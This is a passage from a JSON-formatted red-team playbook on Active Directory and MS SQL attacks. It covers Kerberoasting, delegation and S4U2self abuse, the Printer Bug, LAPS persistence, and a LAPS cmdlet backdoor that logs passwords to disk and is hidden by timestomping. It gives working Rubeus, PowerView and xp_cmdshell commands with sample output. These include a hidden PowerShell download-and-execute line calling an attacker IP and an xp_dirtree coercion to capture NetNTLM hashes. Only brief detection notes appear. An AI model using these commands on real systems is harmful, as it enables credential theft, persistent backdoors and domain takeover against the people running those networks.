unJ966veiMXllOu4n88hvAcX/6j71To9JJU5Ec48Pds=\n  ASREP (key)              :  6F8361B5177CCC416E67A297C9D61AC975DEAA9E0505DE86657F16EAE9AD8F72\n``````"
        ],
        "tools": [
            "ADSearch",
            "BloodHound",
            "Powermad",
            "PowerView",
            "Rubeus"
        ],
        "steps": []
    },
    {
        "id": "a762e69a-6039-4b4c-a9c2-d7f7e9fca287",
        "name": "Kerberoasting",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1558.003",
        "external": false,
        "description": "NoDescription",
        "content": "# Kerberoasting\nServices run on a machine under the context of a user account. These accounts are either local to the machine (LocalSystem, LocalService, NetworkService) or are domain accounts (e.g. `DOMAIN\\mssql`).\n\nA Service Principal Name (SPN) is a unique id of a service instance. SPNs are configured on the User Object and used by [[Kerberos]] to match a service instance to a logon account.\n\nPart of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service. By Kerberoasting a TGS is requested for the user running that service which can be cracked offline to reveal the users plain-text passwords.\n\nProcess:\n1. Identify users with:\n- [[BloodHound#Kerberoasting]]\n- [[ADSearch#Identify kerberoastable users]]\n2. [[Rubeus]] can be used to perform the kerberoasting.\n- [[Rubeus#Kerberoasting]]\n- [[Rubeus#Targeted Kerberoasting]]\n3. Cracking\n- [[Hashcat#Cracking krb5tgs]]\n\n## Detection\nWhen a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.\n\nYou can find them in Kibana with:\n>event.code: 4769\n\n>event.code: 4769 and winlog.event_data.ServiceName : svc_xxx\n\n\n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [
            "\n## [[ADSearch]]\nIdentify Kerberoastable user\n``````beacon\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&(sAMAccountType=805306368)(servicePrincipalName=*))\"\n  \n[*] No domain supplied. This PC's domain will be used instead\n[*] LDAP://DC=edu,DC=evil,DC=corp\n[*] CUSTOM SEARCH: \n[*] TOTAL NUMBER OF SEARCH RESULTS: 2\n [+] cn : krbtgt\n [+] cn : MS SQL Service\n [+] cn : Honey Service\n``````",
            "\n## [[BloodHound]]\n- Kerberoastable users\n>MATCH (u:User {hasspn:true}) RETURN u\n- With paths to computers\n>MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p\n- List of kerberoastable users with groups\n> MATCH (m:User {hasspn:true}), (n:Group), p=(m)-[:MemberOf]->(n) RETURN m.name as Account, n.name as Group, m.hasspn as Kerberoastable",
            "\n## [[Rubeus]]\n\u26a0\ufe0f This will kerberoast ALL accounts with SPN's!\n#OPSEC only do targeted kerberoast\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe kerberoast /simple /nowrap\n\n[*] Action: Kerberoasting\n[*] Searching the current domain for Kerberoastable users\n[*] Total kerberoastable users : 2\n\n$krb5tgs$23$*svc_mssql$edu.evil.corp$MSSQLSvc/srv1.edu.evil.corp:1433*$[...hash...]\n$krb5tgs$23$*svc_honey$edu.evil.corp$HoneySvc/fake.edu.evil.corp*$[...hash...]\n``````\n\n## Targeted [[Kerberoasting]]\n1. Identify users: [[ADSearch#Identify kerberoastable Users]]\n2. Targeted [[Kerberoasting]]\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe kerberoast /user:svc_mssql /nowrap\n\n[*] Action: Kerberoasting\n[*] Target User            : svc_mssql\n[*] Searching the current domain for Kerberoastable users\n[*] Total kerberoastable users : 1\n[*] SamAccountName         : svc_mssql\n[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=edu,DC=evil,DC=corp\n[*] ServicePrincipalName   : MSSQLSvc/srv1.edu.evil.corp:1433\n[*] PwdLastSet             : 5/14/2022 1:28:34 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*svc_mssql$edu.evil.corp$MSSQLSvc/srv1.edu.evil.corp:1433*$[...hash...]\n``````\n3. Cracking with [[Hashcat#Cracking krb5tgs]]"
        ],
        "tools": [
            "ADSearch",
            "BloodHound",
            "Rubeus"
        ],
        "steps": []
    },
    {
        "id": "2f85eaf6-17a6-4f36-85ab-eb8fd0499fd1",
        "name": "Linux Credential Cache",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Linux Credential Cache\nKerberos Credential Cache (ccache) files store the Kerberos credentials, usually a TGT, of a user authenticated to a domain-joined Linux machine. With it you can request a service ticket (TGS) for any other service in the domain.\n\n``````sh\nproxychains ssh svc_oracle@10.10.17.12\nsvc_oracle@nix-1:~$ ls -l /tmp/\ntotal 20\n-rw------- 1 john      domain users 1442 Fen  16 18:13 krb5cc_1404221486_AegEwB\n-rw------- 1 svc_oracle domain users 1441 Feb 16 18:05 krb5cc_1404221620_WdEgwg\n\nsudo -l\nsudo -i\n``````\n\nFor Cobalt Strike the linux ccache needs to be converted via the following **Impacket** commands to make it compatible with the `kerberos_ccache_use` command. After that the kirbi can be used with [[Overpass-the-Hash]] and a sacrificial logon session.\n\n``````sh\nimpacket-ticketConverter krb5cc_1404221486_AegEwB doe.kirbi\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n[*] converting ccache to kirbi...\n[+] done\n``````\n\n\n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "35bdc37e-81a4-4618-bcbb-ca785e8f91c8",
        "name": "Printer Bug",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Printer Bug\nForcing any machine in a forest to authenticate to another machine via the MS-RPRN Print System Remote Protocol. It interfaces between a print client and a print server via the print job processing and print system management.\nMoreover, this RPC service is accessible by all domain users, and enabled by default.\n\nThe process:  \n1. Use **RpcRemoteFindFirstPrinterChangeNotificationEx()**, to set up a change notification between a print server (dc-2) and a print client (wkstn1). This caused dc-2 to authenticate to wkstn1.\n2. If wkstn1 is configured with [[Unconstrained Delegation]], this would allow the capture of the dc-2 TGT.\n3. With the dc-2 TGT, a service ticket (TGS) can be created to access any service on dc-2 with local admin privs (-> domain admin).\n\nThe execution:\n1. On the server with [[Unconstrained Delegation]] use [[Rubeus#Unconstrained Delegation]] to monitor\n2. On your workstation execute the PoC\nWhere:\n-   `dc-2` is the \"target\" server    \n-   `wkstn1` is the \"capture\" server\n3. Get the TGT on the server from 1\n``````beacon\n[*] 3/9/2022 12:00:07 PM UTC - Found new TGT:\n\n  User                  :  DC-2$@edu.evil.corp\n  StartTime             :  18/4/2022 12:12:15 AM\n  EndTime               :  18/4/2022 12:12:13 PM\n  RenewTill             :  1/1/1970 12:00:00 AM\n  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable\n  Base64EncodedTicket   :\n\n doERz [...snip...] M=\n\n[*] Ticket cache size: 1\n``````\n4. Use [[Overpass-the-Hash#Manually]] to create a new logon session and [[DCSync]]\n\n\n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [],
        "tools": [
            "SpoolSample",
            "SweetPotato"
        ],
        "steps": []
    },
    {
        "id": "5b0f70c8-a1b6-42db-b7da-6f034b2ba6a7",
        "name": "Resource Based Constrained Delegation (RBCD)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Resource Based Constrained Delegation (RBCD)\n1. Non-privileged account on a Windows 10 machine\n2. Privileges to write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a domain controller\n3. Create a new computer account due to the default MachineAccountQuota = 10\n4. Set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to contain a security descriptor with the computer account from step 3\n5. Leverage Rubeus to abuse resource-based constrained delegation\n\nsources:\n- https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/\n- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution\n\n\n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [
            "\n## [[Powermad]]\nAdd a new machine account\n> New-MachineAccount -MachineAccount test\n\nUse the added account with runas /netonly\n> runas /netonly /user:domain\\test$ powershell\n\nSet the `msDS-AllowedToActOnBehalfOfOtherIdentity` to the current machine\n> Set-MachineAccountAttribute -MachineName dc-1 -Attribute msDS-AllowedToActOnBehalfOfOtherIdentity -Value test-securitydesciptor"
        ],
        "tools": [
            "Powermad"
        ],
        "steps": []
    },
    {
        "id": "d136c430-5fff-4bc7-805a-9ae66f5a1078",
        "name": "S4U2self Abuse",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# S4U2self Abuse\nGain access to a domain computer if we have its RC4, AES256 or TGT.\n\nS4U = Service for User  \nExtensions:\n* S4U2self = Service for User to Self  \nAllows a service to obtain a TGS to itself on behalf of a user\n* S4U2proxy = Service for User to Proxy\nAllows the service to obtain a TGS on behalf of a user to a second service\n\nGaining TGT for a computer wo local admin:\n* [[Kerberos/Printer Bug]] and a machine with [[unconstrained delegation]]\n* [[NTLM relaying]]\n* [[Misconfigured Certificate Templates]]\n\nProblem:  \nA TGT for WKSTN2 imported into a sacrificial session cannot access C$.\n\nSolution:  \nAbuse S4U2self to obtain a TGS to itself, as a user we know **is** a local admin like a domain admin.\n\n## Obtain a TGS to itself\n```beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe s4u /user:WKSTN2$ /msdsspn:cifs/wkstn2.edu.evil.corp /impersonateuser:patrick /ticket:doERz [...snip...] M= /nowrap\n\n[*] Action: S4U\n[*] Building S4U2self request for: 'WKSTN2$@edu.evil.corp'\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Sending S4U2self request to 10.10.17.71:88\n[+] S4U2self success!\n[*] Got a TGS for 'patrick' to 'WKSTN2$@edu.evil.corp'\n[*] base64(ticket.kirbi):\n\n doERAz [...snip...] Mtq=\n\n[*] Impersonating user 'patrick' to target SPN 'cifs/wkstn2.edu.evil.corp'\n[*] Building S4U2proxy request for service: 'cifs/wkstn2.edu.evil.corp'\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Sending S4U2proxy request to domain controller 10.10.17.71:88\n\n[X] KRB-ERROR (13) : KDC_ERR_BADOPTION\n```\n  \nThe S4U2proxy step will fail, which is fine.  Write the S4U2self TGS to a file.\n```powershell\n[System.IO.File]::WriteAllBytes(\"C:\\Users\\Administrator\\Desktop\\wkstn2-s4u.kirbi\", [System.Convert]::FromBase64String(\"doERAz [...snip...] Mtq=\"))\n```\n\nCheck TGT via [[Rubeus#Check stored TGT]].\n\nThe `ServiceName` of WKSTN2$ is not valid for our use - we want it to be for CIFS. This can be easily changed, since the service name is not in the encrypted part of the ticket and is not \"checked\".\n\nTo modify the ticket, open it with the [[ASN Editor]].\n\nTo use the ticket, simply pass it into your session.\n````beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> make_token EDU\\patrick FakePass\n[+] Impersonated EDU\\john\n\nbeacon> kerberos_ticket_use C:\\Users\\Administrator\\Desktop\\wkstn2-s4u.kirbi\n\nbeacon> ls \\\\wkstn2.edu.evil.corp\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/19/2022 14:35:19   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n\n\n \n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [
            "\n## [[ASN Editor]]\nTo modify a ticket, open it with the ASN Editor.  Find the two instances where the **GENERAL STRING** \"WKSTN2$\" appears. ![](/Images/Pasted%20image%2020220316222605.png)\nDouble-click them to open the **Node Content Editor** and replace these strings with \"cifs\".  We also need to add an additional string node with the FQDN of the machine. Right-click on the parent **SEQUENCE** and select **New**.  Enter **1b** in the **Tag** field and click **OK**.  Double-click on the new node to edit the text.\n ![](/Images/Pasted%20image%2020220316222614.png)"
        ],
        "tools": [
            "ASN Editor"
        ],
        "steps": []
    },
    {
        "id": "c96fafcf-6b76-462a-829e-87d48ab46611",
        "name": "Unconstrained Delegation",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Unconstrained Delegation\nDelegation: User or a service acting on behalf of another user to another service\nExample: User authenticates to a front-end web application that serves a back-end database. The front-end application needs to authenticate to the back-end database (using Kerberos) as user.\n ![](/Images/Pasted%20image%2020220316153112.png)\n\nIf unconstrained delegation: KDC includes a copy of the user\u2019s TGT inside the TGS.\nExample: \n1. User accesses the Web Server, it extracts the user's TGT from the TGS and caches it in memory.\n2. When the Web Server needs to access the DB Server on behalf of that user, it uses cached TGT to request a TGS for the database service.\n3. The caching is **always** being done, also on normal auth. ->Compromise a machine with unconstrained delegation and extract any TGTs.\n\n## Exploit\n1. [[Rubeus#Unconstrained Delegation]] can be used to monitor for new TGTs cached on the machine.\n2. [[Kerberos/Printer Bug]]\n\n\n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list AD objects with Unconstrained Delegation enabled,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command unconstrained \n```",
            "\n## [[ADSearch]]\nIdentify unconstrained delegation\n``````beacon\nbeacon> execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname,operatingsystem\n\n[*] No domain supplied. This PC's domain will be used instead\n[*] LDAP://DC=edu,DC=evil,DC=corp\n[*] CUSTOM SEARCH: \n[*] TOTAL NUMBER OF SEARCH RESULTS: 2\n [+] samaccountname     : DC-2$\n [+] dnshostname        : dc-2.edu.evil.corp\n [+] operatingsystem    : Windows Server 2016 Datacenter\n\n [+] samaccountname     : SRV1$\n [+] dnshostname        : srv1.edu.evil.corp\n [+] operatingsystem    : Windows Server 2016 Datacenter\n``````",
            "\n## [[BloodHound]]\n>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c",
            "\n## [[Rubeus]]\nRequires Admin\nMonitor with [[Rubeus]] for new cached TGT's\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe monitor /targetuser:patrick /interval:10\n\n[*] Action: TGT Monitoring\n[*] Target user     : patrick\n[*] Monitoring every 10 seconds for new TGTs\n\njobs\n\njobkill 1\n``````\n\nWrite the base64 decoded string to a `.kirbi` file, create a new sacrificial logon session, pass the TGT [[Overpass-the-Hash#Manual]]"
        ],
        "tools": [
            "ADReaper",
            "ADSearch",
            "BloodHound",
            "Rubeus"
        ],
        "steps": []
    },
    {
        "id": "877abf27-ca85-434c-8e90-739356c8aaff",
        "name": "LAPS Backdoor",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Local Administrator Password Solution (LAPS) backdoor\nLocation of the LAPS scripts:\n```sh\nbeacon> ls\n[*] Listing: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AdmPwd.PS\\\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n\t\t  dir     03/10/2022 17:09:59   en-US\n 30kb     fil     03/10/2022 00:38:16   AdmPwd.PS.dll\n 5kb      fil     03/10/2022 14:40:58   AdmPwd.PS.format.ps1xml\n 4kb      fil     03/10/2022 14:40:58   AdmPwd.PS.psd1\n 33kb     fil     03/10/2022 08:02:08   AdmPwd.Utils.dll\n```\n\n1. Backdoor the `Get-AdmPwdPassword`: `https://github.com/GreyCorbel/admpwd`.\n    ```powershell\n    [Cmdlet(\"Get\", \"AdmPwdPassword\")]\n    public class GetPassword : Cmdlet\n    {\n        [Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]\n        public String ComputerName;\n\n        protected override void ProcessRecord() {\n            foreach (string dn in DirectoryUtils.GetComputerDN(ComputerName))\n            {\n                PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);\n                #added\n                var line = $\"{pi.ComputerName} : {pi.Password}\";\n                System.IO.File.AppendAllText(@\"C:\\Temp\\LAPS.txt\", line);\n                #added end\n                WriteObject(pi);\n            }\n        }\n    }\n    ```\n  \n2. Upload `AdmPwd.PS.dll` to the machine.\n    > beacon> upload C:\\Tools\\admpwd\\Main\\AdmPwd.PS\\bin\\Debug\\AdmPwd.PS.dll\n\n3. Clone the `AdmPwd.PS.psd1` timestamp and apply it to `AdmPwd.PS.dll`.\n    > beacon> timestomp AdmPwd.PS.dll AdmPwd.PS.psd1\n\n\n## Tools\n########\n########",
        "category": "LAPS",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "d57dbcf9-32b8-4a55-910e-20dda01e1616",
        "name": "LAPS Persistence",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Local Administrator Password Solution (LAPS) Persistence\n\n## Increase expiration date (persistence)\n\u26a0\ufe0fThe password will still reset in case of:\n- `Reset-AdmPwdPassword` cmdlet\n- `Do not allow password expiration time longer than required by policy` is enabled in the LAPS GPO.\n\nRequirements:\n* Expiration time = epoch value\n* SYSTEM permission\n\n>powershell Get-DomainObject -Identity wkstn2 -Properties ms-mcs-admpwdexpirationtime\n\n>powershell Set-DomainObject -Identity wkstn2 -Set @{\"ms-mcs-admpwdexpirationtime\"=\"1913564304000\"}\n```\n\n```beacon\nbeacon> powershell Get-AdmPwdPassword -ComputerName wkstn2 | fl\n\nComputerName        : WKSTN2\nDistinguishedName   : CN=WKSTN2,OU=Workstations,DC=edu,DC=evil,DC=corp\nPassword            : awdc1948wa4dc1\nExpirationTimestamp : 8/21/2030 5:38:24 PM\n```\n\n\n## Tools\n########\n########",
        "category": "LAPS",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "2a551522-a596-4694-acc4-4eef07127e67",
        "name": "Local Administrator Password Solution (LAPS)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Local Administrator Password Solution (LAPS)\nWhen machines are build with a golden image to ensure consistency and compliance every machine receives the same password for each user.\n\nLAPS by Microsoft is a solution to manage credentials of the local administrator (RID 500 or custom) account on every machine. It ensures that the password for each account is different, random, and automatically changed on a defined schedule. \n\nThe process:\n1.  The Active Directory schema has two new attributes to computer objects, called `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime`.\n2.  By default, only a Domain Admin can read the `AdmPwd` attribute. Each computer can update these attributes on its own object.\n3.  Rights to read `AdmPwd` can be delegated (users, groups etc).\n4.  GPOs are ususally used to deploy LAPS (or SCCM) and its configuration.\n6.  On `gpupdate`, the LAPS will check the machines `AdmPwdExpirationTime` attribute. If the received time is passed, it will generate a new password \nand updates the `AdmPwd` attribute.\n\n## Identify\n* Via files\n  > ls C:\\Program Files\\LAPS\\CSE\n* Via GPO guessing [[PowerView#Get GPOs filter with name]]\n  The config can be dumped like this [[Dump GPOs]]\n* Via searching for computers with ``ms-Mcs-AdmPwdExpirationTime`` [[PowerView#Search computers with property]]\n* [[BloodHound#Local Administrator Password Solution (LAPS)]]\n\n\n## Modify\nIf LAPS PowerShell cmdlets are installed\n```beacon\nbeacon> powershell Get-Command *AdmPwd*\n\nCommandType     Name                                               Version    Source\n-----------     ----                                               -------    ------\nCmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS\nCmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS\nCmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS\nCmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS\n```",
        "category": "LAPS",
        "stealthy": false,
        "changes": [
            "\n## [[BloodHound]]\nFind computers that have LAPS applied to them:\n>MATCH (c:Computer {haslaps: true}) RETURN c\n\nAny groups that have an edge to machines via LAPS:\n>MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p",
            "\n## [[PowerView]]\n### Get principals can read LAPS PW\n\n```powershell\nGet-DomainObjectAcl -SearchBase \"LDAP://OU=Workstations,DC=edu,DC=evil,DC=corp\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"ms-Mcs-AdmPwd\" -and $_.ActiveDirectoryRights -like \"*ReadProperty*\" } | select ObjectDN, SecurityIdentifier\n\nObjectDN                                              SecurityIdentifier\n--------                                              ------------------\nOU=Workstations,DC=edu,DC=evil,DC=corp            S-1-5-21-3263068140-2042698922-2891547269-1125\nCN=wkstn1,OU=Workstations,DC=edu,DC=evil,DC=corp S-1-5-21-3263068140-2042698922-2891547269-1125\nCN=WKSTN2,OU=Workstations,DC=edu,DC=evil,DC=corp S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n[[PowerView#Convert SID]]"
        ],
        "tools": [
            "BloodHound",
            "PowerView"
        ],
        "steps": []
    },
    {
        "id": "2a227f4e-cd88-4b51-a66c-8f863d84266e",
        "name": "MS SQL Servers",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# MS SQL Servers\nMicrosoft SQL Server allows in addition to the obvious data theft opportunities also code execution, privilege escalation, lateral movement and persistence.\n\n[[PowerUpSQL]] is an excellent tool for enumerating and interacting with MS SQL Servers.\n-[[PowerUpSQL#Auto information gathering]]\n-[[PowerUpSQL#SQL Query]]\n\n\u26a0\ufe0f Use [[Pass-the-Hash]] to impersonate a user and then use [[PowerUpSQL]] to verify the connection:\n>powerpick Get-SQLConnectionTest -Instance \"sql.rto.local,1433\" | fl\n\n>powerpick Get-SQLQuery -Instance \"sql.rto.local,1433\" -Query \"select @@servername\"\n\n>Invoke-SQLOSCmd -Instance \"sql.rto.local,1433\" -Command \"whoami\" -RawResults\n\nOr use [[mssqlclient]] via [[Proxychains]] or [[HeidiSQL]] via [[Proxifier]] to query\n\n## Tools\n########\n########",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [
            "\n## [[HeidiSQL]]\nSQL client to work with MS SQL Servers",
            "\n## [[mssqlclient]]\n```bash\nproxychains python3 /usr/local/bin/mssqlclient.py -windows-auth EDU/john@10.10.1.20\n\nProxyChains-3.1 (http://proxychains.sf.net)\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n|S-chain|-<>-127.0.0.1:1080-<><>-10.10.1.20:1433-<><>-OK\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(SRV1): Line 1: Changed database context to 'master'.\n[*] INFO(SRV1): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (130 19162)\n[<>] Press help for extra shell commands\nSQL> select @@servername;\n\nSRV1\n```"
        ],
        "tools": [
            "HeidiSQL",
            "mssqlclient"
        ],
        "steps": []
    },
    {
        "id": "e6614181-d170-4176-97e2-2444672d25c0",
        "name": "SQL Command Execution",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# SQL Command Execution\nThe **xp_cmdshell** procedure can be used to execute shell commands on the SQL server.\n\n## Exploit\n- [[PowerUpSQL#Command Execution]]\n- Manually via [[HeidiSQL]] or [[mssqlclient]]\n>EXEC xp_cmdshell 'whoami'; \n- Spawn a beacon with\n>EXEC xp_cmdshell 'powershell -w hidden -enc [base64_content]';\n\n```beacon\n# Create a portforward from a beacon to kali\nrportfwd 8080\n# create a pivot listener on the beacon\nwkstn1-pivot\n# create scripted web delivery\n/w1 delivering wkstn1-pivot, x64\n# use IEX((...)) with replaced ip address\n$str = 'IEX((new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/w1\"))'\n[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip\nEXEC xp_cmdshell 'powershell -w hidden -enc SQBF[...snip...]AA==';\n```\n\n## Enable xp_cmdshell\n#OPSEC reset to original state!\n\nTo enumerate the current state of xp_cmdshell, use:\n>SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';\n\n ![](/Images/Pasted%20image%2020220321170241.png)\n\n>sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n\n\n## Tools\n########\n########",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [
            "\n## [[PowerUpSQL]]\n### Command Execution\n```ps\nInvoke-SQLOSCmd -Instance \"srv1.edu.evil.corp,1433\" -Command \"whoami\" -RawResults\n\nedu\\svc_mssql\n```"
        ],
        "tools": [
            "PowerUpSQL"
        ],
        "steps": []
    },
    {
        "id": "73975cbe-92d1-439d-bee7-6d7d22109679",
        "name": "SQL Lateral Movement",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# SQL Lateral Movement\nLinked Servers allows a database to access data from an external source.\n\n## Identify and test automatically\nUse [[PowerUpSQL#Crawl SQL Server Link]]\n\n## Test manually\n1. Discover links of the current instance:\n    >SELECT * FROM master..sysservers;\n\n2. Query this remote instance over the link using **OpenQuery**:  \n\u26a0\ufe0f Single and double quotes matter!\n    > SELECT * FROM OPENQUERY(\"sql1.evil.corp\", 'select @@servername');\n\n3. Check xp_cmdshell via link\nCheck MS SQL configuration via link\n    >SELECT * FROM OPENQUERY(\"sql1.evil.corp\", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');\n\n4. If **RPC Out** is enabled on the link (not default), then you can enable xpcmdshell using the following syntax:\n    >EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]\n\n    >EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]\n\n5. Exploit via link\n    >SELECT * FROM OPENQUERY(\"sql1.evil.corp\", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')\n\n    >SELECT * FROM OPENQUERY(\"sql1.evil.corp\", 'select * from openquery(\"sql01.evil.external\", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')\n\n\n## Tools\n########\n########",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [
            "\n## [[PowerUpSQL]]\n### Crawl SQL Server Link\nManually querying databases to find links can be cumbersome and time-consuming, so you can also use `Get-SQLServerLinkCrawl` to automatically crawl all available links.\n```ps\nGet-SQLServerLinkCrawl -Instance \"srv1.edu.evil.corp,1433\"\n\nVersion     : SQL Server 2016 \nInstance    : SRV1\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1}\nUser        : EDU\\john\nLinks       : {SQL-1.EVIL.CORP}\n\nVersion     : SQL Server 2016 \nInstance    : SQL-1\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1, SQL-1.EVIL.CORP}\nUser        : sa\nLinks       : {SQL01.evil.external}\n\nVersion     : SQL Server 2019 \nInstance    : SQL01\\SQLEXPRESS\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1, SQL-1.EVIL.CORP, SQL01.evil.external}\nUser        : sa\nLinks       :\n```"
        ],
        "tools": [
            "PowerUpSQL"
        ],
        "steps": []
    },
    {
        "id": "236428c7-ee37-4dd5-bea9-9a44ad665180",
        "name": "SQL NetNTLM Capture",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# NetNTLM Capture\nThe **xp_dirtree** procedure can be used to capture the NetNTLM hash of the principal being used to run the MS SQL Service. \n\n## Tools\n########\n########",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [
            "\n## [[InveighZero]]\nWe can use [[InveighZero]] to listen to the incoming requests (this should be run as a local admin).\n1. [[InveighZero#Capture NetNTLM hash]]\n2. Run `xp_dirtree` to connect the sql server to your machine running [[InveighZero]]\n>EXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1\n3. Receive hash on the attacking machine\n```beacon\n[+] [2022-05-14T15:33:49] TCP(445) SYN packet from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLMv2 captured for EDU\\svc_mssql from 10.10.1.20(SRV1):50323:\nsvc_mssql::EDU:[...snip...]\n```\n4. [[Hashcat#Cracking netntlmv2]]",
